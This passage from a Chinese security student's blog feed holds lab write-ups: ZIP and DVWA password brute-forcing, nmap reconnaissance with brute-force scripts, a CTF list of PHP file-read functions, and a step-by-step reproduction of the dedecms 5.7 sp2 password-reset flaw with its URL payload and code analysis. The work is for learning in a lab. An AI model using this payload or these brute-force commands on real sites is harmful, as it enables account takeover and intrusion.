src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124185054140.png" alt="image-20211124185054140"></p><p>在查找框中输入zip的文件头<code>504b0304</code>,在过滤框中输入<code>ftp-data</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124185839994.png" alt="image-20211124185839994"></p><blockquote><p>可以看到有两个文件，1.zip和复习题.txt，下面是对文件进行还原保存</p></blockquote><blockquote><p>选中1.zip的数据流，右键-&gt;追踪流-&gt;TPC流,然后</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124191030128.png" alt="image-20211124191030128"></p><blockquote><p>保存得到1.zip</p></blockquote><ul><li>3.4 还原ZIP文件并打开（ZIP有解压密码，试图破解，提示：密码全为数字，并为6位）。截图破解过程。</li></ul><blockquote><p>尝试解压1.zip发现需要密码，直接丢进kali进行爆破</p><p>先下载fcrackzip</p></blockquote><pre><code>sudo apt-get fcrackzip</code></pre><p>1.zip的位置在桌面，在桌面打开终端，输入下面命令</p><pre><code>fcrackzip -v -b -u -l 1-10 -c1 1.zip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124192057379.png" alt="image-20211124192057379"></p><blockquote><p>得到密码为<code>123456</code></p></blockquote><blockquote><p>fcrackzip的使用查看这篇<a href="https://blog.csdn.net/weixin_41924764/article/details/114682970">文章</a></p></blockquote><blockquote><p>解压后得到如下图片</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/Penguins.jpg" alt="Penguins"></p><ul><li>3.5 TXT文件的内容是什么？</li></ul><blockquote><p>这个不用保存就可以看到，选中复习题.txt的数据流，右键-&gt;追踪流-&gt;TPC流,然后就可以看到内容了</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124191431879.png" alt="image-20211124191431879"></p><ul><li><p>网站密码破解部分：</p><p>  利用人们平时常用的词、句破译，如果说暴力破解是一个一个的尝试那么字典破译就是利用人们习惯用人名、地名或者常见的词语设置成密码的习惯进行破译。字典破译速度比暴力破译更快但是有时候密码设置中包含了没有字典库中的词句就无法破解出来了，因此有好的字典是关键。</p><p>以*****为目标网站，构造字典（wordlist），其中包含你的正确密码，利用burpsuite进行字典攻击，实施字典攻击，你是如何判断某个密码为破解得到的正确密码，截图。</p></li></ul><blockquote><p>这里使用Metasploitable2里的DVWA靶场</p><p>1.打开Metasploitable2虚拟机</p><p>2.在kali的火狐浏览器上方地址栏输入Metasploitable2的IP，选择DVWA</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124193443274.png" alt="image-20211124193443274"></p><blockquote><p>登录账号密码为admin&#x2F;password</p><p>登录后选择Brute Force</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194538283.png" alt="image-20211124194538283"></p><blockquote><p>原本的账号密码为admin&#x2F;password，登录成功后是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194701364.png" alt="image-20211124194701364"></p><blockquote><p>登录不成功是这样的</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124194800988.png" alt="image-20211124194800988"></p><blockquote><p>不会使用burpsuite的先看看<a href="https://www.bilibili.com/video/BV1Xy4y1y7Mx?from=search&seid=15882274739572418192&spm_id_from=333.337.0.0">这个</a>选择性观看即可</p><p>一般情况下，我们是不知道账号密码的，所以我们需要爆破，爆破需要字典，字典可自己收集或去下载</p><p>打开代理，在登录页面随便输入密码(假设已经知道账号为admin),点击登录，抓包成功，把它发送到爆破功能模块intruder</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124200639770.png" alt="image-20211124200639770"></p></blockquote><blockquote><p>选择要爆破的部分即密码，然后点击<code>add$</code> </p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124201239679.png" alt="image-20211124201239679"></p><blockquote><p>导入字典，开始爆破</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124201552140.png" alt="image-20211124201552140"></p><blockquote><p>点击Length,发现有返回长度不一样的，大概率是正确的密码</p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124202556893.png" alt="image-20211124202556893"></p><p>爆破成功，密码为password</p><ul><li><p>4、MD5破解：</p><p>  SqlMap得到某数据库用户表信息，用户口令的MD5值为7282C5050CFE7DF5E09A33CA456B94AE那么，口令的明文是什么？（提示：MD5值破解）</p><blockquote><p><a href="https://pmd5.com/">解密网站</a></p></blockquote><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211124203226749.png" alt="image-20211124203226749"></p></li><li><p>5、John the Ripper的作用是什么？</p></li></ul><blockquote><p>John 是一款老牌的暴力破解密码的工具，拥有自带的字典，可以用来爆破一些简单的弱口令密码</p></blockquote><ul><li><p>思考问题： </p><ul><li>1、 谈谈如何防止ARP攻击。</li></ul><blockquote><ul><li>静态绑定IP地址和MAC地址</li><li>双绑措施，在路由器和终端上都进行IP-MAC绑定的措施，它可以对ARP欺骗的两边，伪造网关和截获数据，都具有约束的作用。这是从ARP欺骗原理上进行的防范措施，也是最普遍应用的办法。它对付最普通的ARP欺骗是有效的</li><li>安装 ARP 防火墙</li></ul></blockquote><ul><li>2、 安全的密码（口令）应遵循的原则。</li></ul><blockquote><ul><li>不能是弱密码（如123456、admin、root、88888888）</li><li>不要带有自己的生日或者名字缩写等容易被社工到的信息，可能会被组合成密码字典进行爆破</li></ul></blockquote><ul><li><p>3、 谈谈字典攻击中字典的重要性。</p><blockquote><ul><li>一个弱口令字典常常是打开渗透突破口的第一步</li><li>通过社会工程学组合而成的字典杀伤力很大，能提高密码爆破的成功率</li><li>一些可以用来 fuzzing 的字典可以测试网站的 waf ，比如过滤掉了哪些字符串</li></ul></blockquote></li></ul></li></ul><h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>本次实验最重要的就是学到了 ARP 协议和 ARP 欺骗，以前只是听说过，这回仔细找资料并且动手实践了，其次还明白了密码的重要性，最后是对 Wireshark 软件的使用更加熟练了一些，流量分析也学到了不少简练的操作</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dedecms5.7 sp2前台修改任意用户密码漏洞复现</title>
      <link href="/2021/11/22/dedecms5-7-sp2%E5%89%8D%E5%8F%B0%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/11/22/dedecms5-7-sp2%E5%89%8D%E5%8F%B0%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="dedecms5-7-sp2前台修改任意用户密码漏洞复现"><a href="#dedecms5-7-sp2前台修改任意用户密码漏洞复现" class="headerlink" title="dedecms5.7 sp2前台修改任意用户密码漏洞复现"></a>dedecms5.7 sp2前台修改任意用户密码漏洞复现</h1><p><img src="https://img-blog.csdnimg.cn/20200708203502702.gif" alt="20200708203502702"></p><h2 id="复现前的准备"><a href="#复现前的准备" class="headerlink" title="复现前的准备"></a>复现前的准备</h2><p>下载dedecms5.7 sp2,本人复现用的是UTF8版本的。</p><p><a href="https://www.xiuzhanwang.com/dedecms_az/1749.html">传送门</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122223938824.png" alt="image-20211122223938824"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>phpstudy<br>burp Suite</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>首先在本地搭建这个cms,使用phpstudy</p><p>把解压后的文件丢进phpstudy的www目录下，可改一下文件夹名，这里改成了dedecms</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225526149.png" alt="image-20211122225526149"></p><p>根据文件下的docs&#x2F;readme.txt的要求配置环境，然后打开服务，根据提示进行安装</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122224739581.png" alt="image-20211122224739581"></p><p>安装事需要到数据库，直接在phpstudy创建</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122225037921.png" alt="image-20211122225037921"></p><p>安装成功后进入后台&#x2F;dedecms&#x2F;uploads&#x2F;dede&#x2F;index.php，进行如下设置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230017391.png" alt="image-20211122230017391"></p><p>然后访问&#x2F;dedecms&#x2F;uploads&#x2F;member&#x2F;index.php点击注册</p><p>这里注册两个账号（不要设置安全问题）</p><p>受害用户  text&#x2F;123456</p><p>攻击者   hacher&#x2F;123456</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230934064.png" alt="image-20211122230934064"></p><p>站在攻击者的角度，攻击者是不知道受害用户的密码的，现在的目的是登录受害用户的账号</p><p>现在先登录攻击者账号再将URL中member后的内容改为resetpassword.php?dopost&#x3D;safequestion&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;&amp;id&#x3D;3</p><p>上图的mid即为id,hacker账号的mid为3，所以url后面填写id&#x3D;3 </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122230838209.png" alt="image-20211122230838209"></p><p>访问<a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanswer=&id=3">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3</a></p><p>用burp Suite抓包，我在chrome浏览器抓不到本地的包，所以转用火狐，火狐抓本地的包需要改一些设置<a href="https://blog.csdn.net/XavierDarkness/article/details/91410910">传送门</a></p><p>抓到包后发给repeater,进行重放</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232233520.png" alt="image-20211122232233520"></p><p>把id改一下，要不得不到红圈得链接</p><p><a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</a></p><p>把没用得参数<code>amp;</code>去除，得到</p><p><a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</a></p><p>直接访问这个链接就可以改密码了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232631788.png" alt="image-20211122232631788"></p><p>修改密码后成功登录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122232855916.png" alt="image-20211122232855916"></p><p>把<a href="http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&id=2&key=f2O1mLr8%E7%9A%84id%E7%9A%84%E5%80%BC%E6%94%B9%E6%88%90%E5%85%B6%E4%BB%96%E7%9A%84%EF%BC%8C%E5%B0%B1%E8%83%BD%E6%94%B9%E5%85%B6%E4%BB%96%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E4%BA%86%EF%BC%8C%E5%8C%85%E6%8B%ACadmin%EF%BC%88id=1%EF%BC%89">http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8的id的值改成其他的，就能改其他其他用户的密码了，包括admin（id=1）</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211122233053082.png" alt="image-20211122233053082"></p><p>复现结束。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>刚刚使用的payload是<code>http://127.0.0.1/dedecms/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=f2O1mLr8</code> </p><p>可以看出该漏洞出现在member目录下的resetpassword.php文件里</p><p>根据网上的分析，出现漏洞的原因是<code>前台resetpassword.php中对接受的safeanswer参数类型比较不够严格，遭受弱类型比较攻击</code></p><p>打开文件，查看漏洞出现位置</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123210547435.png" alt="image-20211123210547435"></p><p>我们构造payload时有dopost&#x3D;getpasswd</p><p>所以能够满足<code>$dopost==&quot;safequestion&quot;</code>,进入了下面的赋值和判断</p><pre><code>if(empty($safequestion)) $safequestion = &#39;&#39;;if(empty($safeanswer)) $safeanswer = &#39;&#39;;if($row[&#39;safequestion&#39;] == $safequestion &amp;&amp; $row[&#39;safeanswer&#39;] == $safeanswer)    &#123;        sn($mid, $row[&#39;userid&#39;], $row[&#39;email&#39;], &#39;N&#39;);        exit();    &#125;    else    &#123;        ShowMsg(&quot;对不起，您的安全问题或答案回答错误&quot;,&quot;-1&quot;);        exit();    &#125;</code></pre><p>就是这里的判断出现了问题，由网上的文章了解到在dedecms的数据库中，如果用户没有设置安全问题则数据库里存储的safequestion默认为”0”，safeanswer默认为’null’。因为在PHP的弱比较中<code>&#39;&#39;和NULL</code>的比较返回的是true</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211123213118407.png" alt="image-20211123213118407"></p><p>因为使用了不够严谨的 &#x3D;&#x3D; 进行了比较，两个等号是弱比较，导致if语句的条件为真，就会进入分支，进入sn函数</p><p>sn函数位置<code>/member/inc/inc_pwd_functions.php(150行)</code></p><pre><code>function sn($mid,$userid,$mailto, $send = &#39;Y&#39;)&#123;    global $db;    $tptim= (60*10);    $dtime = time();    $sql = &quot;SELECT * FROM #@__pwd_tmp WHERE mid = &#39;$mid&#39;&quot;;    $row = $db-&gt;GetOne($sql);    if(!is_array($row))    &#123;        //发送新邮件；        newmail($mid,$userid,$mailto,&#39;INSERT&#39;,$send);    &#125;    //10分钟后可以再次发送新验证码；    elseif($dtime - $tptim &gt; $row[&#39;mailtime&#39;])    &#123;        newmail($mid,$userid,$mailto,&#39;UPDATE&#39;,$send);    &#125;    //重新发送新的验证码确认邮件；    else    &#123;        return ShowMsg(&#39;对不起，请10分钟后再重新申请&#39;, &#39;login.php&#39;);    &#125;&#125;</code></pre><p>在sn函数内部，会根据id到pwd_tmp表中判断是否存在对应的临时密码记录，根据结果确定分支，走向newmail函数</p><p>newmail函数位置<code>member/inc/inc_pwd_functions.php(73行)</code></p><pre><code>function newmail($mid, $userid, $mailto, $type, $send)&#123;    global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;    $mailtime = time();    $randval = random(8);    $mailtitle = $cfg_webname.&quot;:密码修改&quot;;    $mailto = $mailto;    $headers = &quot;From: &quot;.$cfg_adminemail.&quot;\r\nReply-To: $cfg_adminemail&quot;;    $mailbody = &quot;亲爱的&quot;.$userid.&quot;：\r\n您好！感谢您使用&quot;.$cfg_webname.&quot;网。\r\n&quot;.$cfg_webname.&quot;应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：&quot;.$randval.&quot; 请于三天内登陆下面网址确认修改。\r\n&quot;.$cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;.$mid;    if($type == &#39;INSERT&#39;)    &#123;        $key = md5($randval);        $sql = &quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&#39;$mid&#39;, &#39;$userid&#39;,  &#39;$key&#39;, &#39;$mailtime&#39;);&quot;;        if($db-&gt;ExecuteNoneQuery($sql))        &#123;            if($send == &#39;Y&#39;)            &#123;                sendmail($mailto,$mailtitle,$mailbody,$headers);                return ShowMsg(&#39;EMAIL修改验证码已经发送到原来的邮箱请查收&#39;, &#39;login.php&#39;,&#39;&#39;,&#39;5000&#39;);            &#125; else if ($send == &#39;N&#39;)            &#123;                return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);            &#125;        &#125;        else        &#123;            return ShowMsg(&#39;对不起修改失败，请联系管理员&#39;, &#39;login.php&#39;);        &#125;    &#125;    elseif($type == &#39;UPDATE&#39;)    &#123;        $key = md5($randval);        $sql = &quot;UPDATE `#@__pwd_tmp` SET `pwd` = &#39;$key&#39;,mailtime = &#39;$mailtime&#39;  WHERE `mid` =&#39;$mid&#39;;&quot;;        if($db-&gt;ExecuteNoneQuery($sql))        &#123;            if($send == &#39;Y&#39;)            &#123;                sendmail($mailto,$mailtitle,$mailbody,$headers);                ShowMsg(&#39;EMAIL修改验证码已经发送到原来的邮箱请查收&#39;, &#39;login.php&#39;);            &#125;            elseif($send == &#39;N&#39;)            &#123;                return ShowMsg(&#39;稍后跳转到修改页&#39;, $cfg_basehost.$cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;.$mid.&quot;&amp;amp;key=&quot;.$randval);            &#125;        &#125;        else        &#123;            ShowMsg(&#39;对不起修改失败，请与管理员联系&#39;, &#39;login.php&#39;);        &#125;    &#125;&#125;</code></pre><p>进入newmail函数后，会因为$type的值进入$type &#x3D;&#x3D; ‘INSERT’这个分支，然后因为($send &#x3D;&#x3D; ‘N’)这个条件为真，通过ShowMsg打印出修改密码的连接，导致漏洞形成</p><p>整个过程大概就是酱紫了，收工。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透实验一</title>
      <link href="/2021/11/16/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/"/>
      <url>/2021/11/16/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E5%AE%9E%E9%AA%8C%E4%B8%80/</url>
      
        <content type="html"><![CDATA[<h1 id="网络渗透实验一"><a href="#网络渗透实验一" class="headerlink" title="网络渗透实验一"></a>网络渗透实验一</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>理解网络扫描、网络侦察的作用；通过搭建网络渗透测试平台，了解并熟悉常用搜索引擎、扫描工具的应用，通过信息收集为下一步渗透工作打下基础。</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ul><li>Kali Linux 2</li><li>Windows</li></ul><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><ul><li>交换网络结构</li></ul><h2 id="实验工具"><a href="#实验工具" class="headerlink" title="实验工具"></a>实验工具</h2><ul><li>Metasploitable2（需自行下载虚拟机镜像）；Nmap（Kali）；WinHex、数据恢复软件等</li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ul><li>1、用搜索引擎Google或百度搜索麻省理工学院网站中文件名包含“network security”的pdf文档，截图搜索得到的页面。</li></ul><p>谷歌搜索输入：</p><pre><code>&quot;network security&quot; filetype:pdf site:www.mit.edu</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116183551214.png" alt="image-20211116183551214"></p><ul><li><p>2、照片中的女生在哪里旅行？</p><p>截图搜索到的地址信息。<img src="https://raw.githubusercontent.com/todis21/image/main/img/1.jpg" alt="1"></p></li></ul><p>用谷歌地球搜索图中关键词：LeTrentehuit Cafe Brasserie</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116215629733.png" alt="image-20211116215629733"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116215715666.png" alt="image-20211116215715666"></p><p>* </p><p>  <img src="https://raw.githubusercontent.com/todis21/image/main/img/wps84C7.tmp.jpg" alt="img"></p><p>  3、手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535)可以查询手机接入的基站的位置，从而初步确定手机用户的位置。</p><p>  获取自己手机的LAC和CID：</p><p>  Android 获取方法：Android： 拨号*#<em>#4636#</em>#*进入手机信息工程模式后查看</p><p>  iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest</p><p>  Serving Cell info–&gt;LAC&#x3D;Tracking Area Code –&gt;cellid &#x3D; Cell identity</p><p>  若不能获取，用右图信息。</p><p>  截图你查询到的位置信息。</p><p>用这个网站查询位置:<a href="http://www.minigps.net/map.html">http://www.minigps.net/map.html</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220552707.png" alt="image-20211116220552707"></p><ul><li>编码解码将Z29vZCBnb29kIHN0dWR5IQ&#x3D;&#x3D;解码。截图。</li></ul><p>解码网站 ：<a href="https://tool.chinaz.com/tools/base64.aspx">https://tool.chinaz.com/tools/base64.aspx</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220726362.png" alt="image-20211116220726362"></p><ul><li><p>5、地址信息</p><ul><li>5.1内网中捕获到一个以太帧，源MAC地址为：98-CA-33-02-27-B5；目的IP地址为：202.193.64.34，回答问题：该用户使用的什么品牌的设备，访问的是什么网站？并附截图。</li></ul><p>MAC地址查询网站：<a href="http://www.atoolbox.net/Tool.php?Id=808">http://www.atoolbox.net/Tool.php?Id=808</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116220941713.png" alt="image-20211116220941713"></p><p>ip查物理地址：<a href="https://www.chaipip.com/aiwen.html">https://www.chaipip.com/aiwen.html</a></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116221807669.png" alt="image-20211116221807669"></p><p>从以上查询结果来看，该用户使用苹果的设备，并且从ip地址可知该设备处在物理地址为：广西壮族自治区 桂林市 七星区</p><ul><li>5.2 访问  <a href="https://whatismyipaddress.com/">https://whatismyipaddress.com</a>   得到MyIP信息，利用ipconfig(Windows)或ifconfig(Linux)查看本机IP地址，两者值相同吗？如果不相同的话，说明原因。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116222511356.png" alt="image-20211116222511356"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116222540596.png" alt="image-20211116222540596"></p><pre><code>不相同，因为网站查询到的是公网IP，ipconfig查询到的是内网IP</code></pre><ul><li><p>6、NMAP使用</p><ul><li><p>6.1利用NMAP扫描Metasploitable2（需下载虚拟机镜像）的端口开放情况。并附截图。说明其中四个端口的提供的服务，查阅资料，简要说明该服务的功能。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116223014210.png" alt="image-20211116223014210"></p></li></ul><blockquote><p>21端口ftp文件传输协议：</p><p>该协议是Internet文件传送的基础，它由一系列规格说明文档组成，目标是提高文件的共享性，提供非直接使用远程计算机，使存储介质对用户透明和可靠高效地传送数据</p><p>功能：<br>服务器的上传 和下载，Internet上的控制文件的双向传输。同时，它也是一个应用程序（Application）。用户可以通过它把自己的PC机与世界各地所有运行FTP协议的服务器相连，访问服务器上的大量程序和信息。实现各种操作系统之间的文件交流，建立一个统一的文件传输协议。</p><p>FTP的传输有两种方式：ASCII传输模式和二进制数据传输模式</p></blockquote><blockquote><p>22端口ssh服务:</p><p>在进行数据传输之前，SSH先对联机数据包通过加密技术进行加密处理，加密后在进行数据传输。确保了传递的数据安全。SSH是专为远程登录会话和其他网络服务提供的安全性协议。利用 SSH 协议可以有效的防止远程管理过程中的信息泄露问题，在当前的生产环境运维工作中，绝大多数企业普遍采用SSH协议服务来代替传统的不安全的远程联机服务软件，如telnet(23端口，非加密的)等。</p><p>SSH还能提供类似FTP服务的sftp-server,借助SSH协议来传输数据的.提供更安全的SFTP服务</p></blockquote><blockquote><p>23端口telent远程登录服务</p><p>telnet服务属于典型的客户机&#x2F;服务器模型，当用telnet登录远程计算机的时候，实际上启动了两个程序：运行在本地计算机的telnet客户端程序；运行在登录的远程计算机上的telnet服务程序</p></blockquote><blockquote><p>80端口http服务：</p><p>80端口主要用于WWW(World Wide Web)即万维网传输信息的协议。可以通过HTTP地址(即常说的”网址”)加”:80”来访问网站，因为浏览网页服务默认的端口号都是80，因此只需输入网址即可，不用输入”:80”了。</p></blockquote><ul><li>6.2利用NMAP扫描Metasploitable2的操作系统类型，并附截图。</li></ul><pre><code>nmap -O 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116224619869.png" alt="image-20211116224619869"></p><ul><li><p>6.3 利用NMAP穷举 Metasploitable2上dvwa的登录账号和密码。</p><p>首先用nmap自带的脚本进行探测登陆界面，并且知道 dvwa 在 80 端口上，用<code>http-auth-finder</code>脚本探测站点上的登录授权页面，发现<code>/dvwa/login.php</code></p><pre><code>nmap -p 80 --script http-auth-finder 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211116230430137.png" alt="image-20211116230430137"></p><p>找到和登录授权有关的页面，尝试使用类似于http-form-brute的脚本爆破出一些账户密码，http-form-brute 传参–script-args&#x3D;http-form-brute.path&#x3D;&#x2F;dvwa&#x2F;login.php 目标ip   进行爆破</p><pre><code>nmap -p 80 --script http-form-brute --script-args=http-form-brute.path=/dvwa/login.php 目标ip</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117155603194.png" alt="image-20211117155603194"></p><p>得到账号：admin密码：password</p></li><li><p>6.4 查阅资料，永恒之蓝-WannaCry蠕虫利用漏洞的相关信息。</p></li></ul></li></ul><blockquote><p>蠕虫病毒会通过远程服务器和自身爬虫功能收集局域网内的IP列表，然后对其中的多个服务端口发起攻击，包括RPC服务(135端口)、SQLServer服务(1433端口)、FTP服务(21端口)，同时还会通过 “永恒之蓝”漏洞，入侵445端口，攻击电脑。</p><p>该病毒针对企业不便关闭的多个常用端口进行攻击，并且利用了局域网电脑中普遍未修复的”永恒之蓝”漏洞，一旦任何一台电脑被该病毒感染，将意味着局域网内所有电脑都面临被感染的风险，尤其给政企机构用户造成极大威胁。</p><p>如果病毒成功入侵或攻击端口，就会从远程服务器下载病毒代码，进而横向传播给局域网内其他电脑。同时，该病毒还会在被感染电脑中留下后门病毒，以准备进行后续的恶意攻击，不排除未来会向用户电脑传播更具威胁性病毒的可能性，例如勒索病毒等</p></blockquote><ul><li>7、利用ZoomEye搜索一个西门子公司工控设备，并描述其可能存在的安全问题</li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117155503789.png" alt="image-20211117155503789"></p><p>利用 ZoomEye 搜索到的西门子公司工控设备，其 IP 、开放的端口号、国家等信息暴露出来，可能导致某些服务（例如 SSH、telnet等）被爆破弱口令，进而导致正常服务被破坏</p><ul><li><p>8、Winhex简单数据恢复与取证</p><ul><li><p>8.1 elephant.jpg不能打开了，利用WinHex修复，说明修复过程。</p><p>该图片的文件头出错，正常的.JPG文件头是：FF D8 FF E0,用winhex打开该图片，修改文件头即可恢复</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117160704969.png" alt="image-20211117160704969"></p><pre><code>     恢复后的图片：</code></pre></li></ul></li></ul><p>​<img src="https://raw.githubusercontent.com/todis21/image/main/img/elephant.jpg" alt="elephant"></p><ul><li><ul><li>8.2 笑脸背后的阴霾：图片smile有什么隐藏信息。</li></ul><p>用winhex打开，隐藏的信息在最后面：<code>tom is the killer</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117161338447.png" alt="image-20211117161338447"></p></li><li><ul><li>8.3 尝试使用数据恢复软件恢复你的U盘中曾经删除的文件。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/todis21/image/main/img/image-20211117163522285.png" alt="image-20211117163522285"></p><ul><li><p>9。实验总结</p><p>通过本次实验学习到了一些被动扫描的技巧，包括照片定位、通过MAC查询设备以及如何更好的利用搜索引擎，还学习到了 Nmap 的主动扫描技巧，还有一些对文件隐写的常用操作，比如修复损坏的文件头，查看隐藏在文件里的二进制信息等</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花式读取文件</title>
      <link href="/2021/11/07/%E8%8A%B1%E5%BC%8F%E8%AF%BB%E6%96%87%E4%BB%B6/"/>
      <url>/2021/11/07/%E8%8A%B1%E5%BC%8F%E8%AF%BB%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="花式读取文件"><a href="#花式读取文件" class="headerlink" title="花式读取文件"></a>花式读取文件</h1><h2 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h2><p>hightlight_file($filename);</p><p>show_source($filename);</p><p>print_r(php_strip_whitespace($filename));</p><p>print_r(file_get_contents($filename));</p><p>readfile($filename);</p><p>print_r(file($filename)); &#x2F;&#x2F; var_dump</p><p>fread(fopen($filename,”r”), $size);</p><p>include($filename); &#x2F;&#x2F; 非php代码</p><p>include_once($filename); &#x2F;&#x2F; 非php代码</p><p>require($filename); &#x2F;&#x2F; 非php代码</p><p>require_once($filename); &#x2F;&#x2F; 非php代码</p><p>print_r(fread(popen(“cat flag”, “r”), $size));</p><p>print_r(fgets(fopen($filename, “r”))); &#x2F;&#x2F; 读取一行</p><p>fpassthru(fopen($filename, “r”)); &#x2F;&#x2F; 从当前位置一直读取到 EOF</p><p>print_r(fgetcsv(fopen($filename,”r”), $size));</p><p>print_r(fgetss(fopen($filename, “r”))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记</p><p>print_r(fscanf(fopen(“flag”, “r”),”%s”));</p><p>print_r(parse_ini_file($filename)); 